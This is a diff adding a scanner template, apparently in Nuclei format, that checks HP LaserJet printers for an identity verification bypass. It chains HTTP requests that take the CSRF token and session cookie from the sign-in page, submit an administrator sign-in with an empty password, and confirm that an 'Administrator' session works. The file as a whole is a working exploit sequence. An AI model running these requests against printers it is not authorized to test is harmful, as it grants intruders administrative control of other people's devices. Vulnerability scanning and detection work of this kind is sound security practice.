@@ -1,0 +1,75 @@
+id: hewlett-packard-laserjet-printer-identity-verification-bypass
+info:
+  name: Hewlett Packard LaserJet Printer Identity Verification Bypass
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: authentication, bypass
+http:
+  - raw:
+      - |
+        GET /hp/device/SignIn/Index HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "CSRFToken"
+
+    extractors:
+      - type: regex
+        name: csrftoken
+        part: body
+        internal: true
+        regex:
+          - 'id="CSRFToken" name="CSRFToken" value="(.*?)"'
+      - type: regex
+        name: cookie1
+        part: header
+        internal: true
+        regex:
+          - 'sessionId=(.*?);'
+
+  - raw:
+      - |
+        POST /hp/device/SignIn/Index HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: sessionId={{cookie1}}
+
+        CSRFToken={{csrftoken}}&agentIdSelect=hp_EmbeddedPin_v1&PinDropDown=AdminItem&PasswordTextBox=&signInOk=Sign+In
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+
+    extractors:
+      - type: regex
+        name: cookie2
+        part: header
+        internal: true
+        regex:
+          - 'Set-Cookie: sessionId=(.*?); path=/'
+
+  - raw:
+      - |
+        GET /hp/device/DeviceStatus/Index HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: sessionId={{cookie2}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "User: Administrator"
+          - "Sign out"
